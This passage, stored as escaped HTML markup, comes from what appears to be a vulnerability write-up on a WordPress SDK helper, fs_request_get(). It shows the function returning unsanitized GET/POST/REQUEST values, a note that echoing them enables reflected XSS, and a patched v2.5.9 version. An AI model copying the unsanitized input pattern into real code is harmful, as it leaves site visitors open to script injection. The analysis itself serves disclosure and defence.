class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;Note&amp;ensp;to&amp;ensp;WordPress.org&amp;ensp;Reviewers:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;&amp;ensp;This&amp;ensp;is&amp;ensp;a&amp;ensp;helper&amp;ensp;method&amp;ensp;to&amp;ensp;fetch&amp;ensp;GET/POST&amp;ensp;user&amp;ensp;input&amp;ensp;with&amp;ensp;an&amp;ensp;optional&amp;ensp;default&amp;ensp;value&amp;ensp;when&amp;ensp;the&amp;ensp;input&amp;ensp;is&amp;ensp;not&amp;ensp;set.&amp;ensp;The&amp;ensp;actual&amp;ensp;sanitization&amp;ensp;is&amp;ensp;done&amp;ensp;in&amp;ensp;the&amp;ensp;scope&amp;ensp;of&amp;ensp;the&amp;ensp;function&amp;#39;s&amp;ensp;usage.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;post&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;fs_request_get()&lt;/code&gt; function is used to &lt;strong&gt;retrieve the value of a parameter from a user request&lt;/strong&gt; (GET, POST, or both), based on the provided key name. If the parameter does not exist, the function returns the default value. The &lt;code&gt;$type&lt;/code&gt; parameter allows explicitly specifying whether the data source is &lt;code&gt;GET&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt;, or all (&lt;code&gt;REQUEST&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The returned data is not sanitized or escaped. If this value is printed to the browser (for example, using &lt;code&gt;echo&lt;/code&gt;) without proper handling, an attacker can inject malicious JavaScript code through request parameters, leading to a &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt; vulnerability.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch v2.5.9:&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;fs_request_get_raw&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;strtolower&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;Note&amp;ensp;to&amp;ensp;WordPress.org&amp;ensp;reviewers:&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;This&amp;ensp;is&amp;ensp;a&amp;ensp;helper&amp;ensp;function&amp;ensp;to&amp;ensp;fetch&amp;ensp;GET/POST&amp;ensp;user&amp;ensp;input&amp;ensp;with&amp;ensp;an&amp;ensp;optional&amp;ensp;default&amp;ensp;value&amp;ensp;when&amp;ensp;the&amp;ensp;input&amp;ensp;is&amp;ensp;not&amp;ensp;set.&amp;ensp;The&amp;ensp;actual&amp;ensp;sanitization&amp;ensp;is&amp;ensp;done&amp;ensp;in&amp;ensp;the&amp;ensp;scope&amp;ensp;of&amp;ensp;the&amp;ensp;function&amp;#39;s&amp;ensp;usage.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;post&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;phpcs:ignore&amp;ensp;WordPress.Security.NonceVerification.Missing&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;get&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;phpcs:ignore&amp;ensp;WordPress.Security.NonceVerification.Recommended&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;phpcs:ignore&amp;ensp;WordPress.Security.NonceVerification.Recommended&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$def&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Don&amp;#39;t&amp;ensp;unslash&amp;ensp;if&amp;ensp;the&amp;ensp;value&amp;ensp;itself&amp;ensp;is&amp;ensp;empty&amp;ensp;(empty&amp;ensp;string,&amp;ensp;null,&amp;ensp;empty&amp;ensp;array&amp;ensp;etc).&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span 